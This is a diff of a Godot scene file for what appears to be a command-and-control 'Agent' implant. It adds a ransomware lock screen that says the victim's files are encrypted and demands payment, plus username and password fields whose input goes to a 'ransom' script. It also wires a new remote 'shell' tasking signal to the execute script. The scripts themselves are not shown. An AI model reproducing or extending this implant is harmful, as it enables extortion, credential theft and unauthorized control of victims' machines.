@@ -1,4 +1,4 @@
-[gd_scene load_steps=9 format=2]
+[gd_scene load_steps=17 format=2]
 
 [ext_resource path="res://execute.gd" type="Script" id=1]
 [ext_resource path="res://api.gd" type="Script" id=2]
@@ -8,6 +8,29 @@
 [ext_resource path="res://checkin.gd" type="Script" id=6]
 [ext_resource path="res://Agent.gd" type="Script" id=7]
 [ext_resource path="res://CallbackTimer.gd" type="Script" id=8]
+[ext_resource path="res://fonts/OpenDyslexic3-Regular.ttf" type="DynamicFontData" id=9]
+[ext_resource path="res://ransom.gd" type="Script" id=10]
+[ext_resource path="res://GUI.gd" type="Script" id=11]
+
+[sub_resource type="DynamicFont" id=1]
+size = 38
+font_data = ExtResource( 9 )
+
+[sub_resource type="DynamicFont" id=2]
+size = 28
+font_data = ExtResource( 9 )
+
+[sub_resource type="DynamicFont" id=3]
+size = 36
+font_data = ExtResource( 9 )
+
+[sub_resource type="DynamicFont" id=4]
+size = 28
+font_data = ExtResource( 9 )
+
+[sub_resource type="DynamicFont" id=5]
+size = 28
+font_data = ExtResource( 9 )
 
 [node name="Agent" type="Node"]
 script = ExtResource( 7 )
@@ -30,12 +53,111 @@ script = ExtResource( 6 )
 [node name="tasking" type="Node" parent="."]
 script = ExtResource( 5 )
 
+[node name="ransom" type="Node" parent="."]
+script = ExtResource( 10 )
+
 [node name="CallbackTimer" type="Timer" parent="."]
 script = ExtResource( 8 )
+
+[node name="GUI" type="Node2D" parent="."]
+script = ExtResource( 11 )
+
+[node name="ColorRect" type="ColorRect" parent="GUI"]
+margin_right = 1024.0
+margin_bottom = 768.0
+rect_min_size = Vector2( 1024, 768 )
+color = Color( 0.0117647, 0, 0, 1 )
+__meta__ = {
+"_edit_use_anchors_": false
+}
+
+[node name="ScreenContainer" type="HBoxContainer" parent="GUI"]
+margin_right = 1024.0
+margin_bottom = 768.0
+alignment = 1
+__meta__ = {
+"_edit_use_anchors_": false
+}
+
+[node name="MessageContainer" type="VBoxContainer" parent="GUI/ScreenContainer"]
+margin_right = 1024.0
+margin_bottom = 768.0
+rect_min_size = Vector2( 1024, 768 )
+alignment = 1
+__meta__ = {
+"_edit_use_anchors_": false
+}
+
+[node name="Label" type="Label" parent="GUI/ScreenContainer/MessageContainer"]
+margin_top = 48.0
+margin_right = 1024.0
+margin_bottom = 125.0
+custom_fonts/font = SubResource( 1 )
+text = "All your system is belong to us!"
+align = 1
+uppercase = true
+
+[node name="Label2" type="Label" parent="GUI/ScreenContainer/MessageContainer"]
+margin_top = 129.0
+margin_right = 1024.0
+margin_bottom = 421.0
+custom_fonts/font = SubResource( 2 )
+text = "We've isolated and encrypted key files on your system...
+While also infecting it with our control software.
+
+We will remove the infection while also restoring your files...for a cost!"
+align = 1
+valign = 1
+autowrap = true
+
+[node name="Label3" type="Label" parent="GUI/ScreenContainer/MessageContainer"]
+margin_top = 425.0
+margin_right = 1024.0
+margin_bottom = 650.0
+custom_fonts/font = SubResource( 3 )
+text = "You must enter your username and password to continue.
+"
+align = 1
+valign = 1
+autowrap = true
+
+[node name="CredentialContainer" type="HBoxContainer" parent="GUI/ScreenContainer/MessageContainer"]
+margin_top = 654.0
+margin_right = 1024.0
+margin_bottom = 720.0
+alignment = 1
+
+[node name="UsernameInput" type="LineEdit" parent="GUI/ScreenContainer/MessageContainer/CredentialContainer"]
+margin_left = 58.0
+margin_right = 484.0
+margin_bottom = 66.0
+rect_min_size = Vector2( 426, 60 )
+custom_fonts/font = SubResource( 4 )
+placeholder_text = "Username"
+
+[node name="PasswordInput" type="LineEdit" parent="GUI/ScreenContainer/MessageContainer/CredentialContainer"]
+margin_left = 488.0
+margin_right = 914.0
+margin_bottom = 66.0
+rect_min_size = Vector2( 426, 60 )
+custom_fonts/font = SubResource( 5 )
+placeholder_text = "Password"
+
+[node name="VerifyButton" type="Button" parent="GUI/ScreenContainer/MessageContainer/CredentialContainer"]
+margin_left = 918.0
+margin_right = 966.0
+margin_bottom = 66.0
+disabled = true
+text = "Verify"
 
 [connection signal="checkin" from="." to="checkin" method="_on_Agent_checkin"]
 [connection signal="tasking" from="." to="tasking" method="_on_Agent_tasking"]
 [connection signal="agent_response" from="api" to="." method="_on_api_agent_response"]
 [connection signal="exit" from="tasking" to="." method="_on_tasking_exit"]
+[connection signal="post_response" from="tasking" to="api" method="_on_tasking_post_response"]
+[connection signal="ransom" from="tasking" to="ransom" method="_on_tasking_ransom"]
+[connection signal="shell" from="tasking" to="execute" method="_on_tasking_shell"]
 [connection signal="whoami" from="tasking" to="execute" method="_on_tasking_whoami"]
 [connection signal="timeout" from="CallbackTimer" to="tasking" method="_on_CallbackTimer_timeout"]
+[connection signal="verify_username_password" from="GUI" to="ransom" method="_on_GUI_verify_username_password"]
+[connection signal="button_up" from="GUI/ScreenContainer/MessageContainer/CredentialContainer/VerifyButton" to="GUI" method="_on_VerifyButton_button_up"]
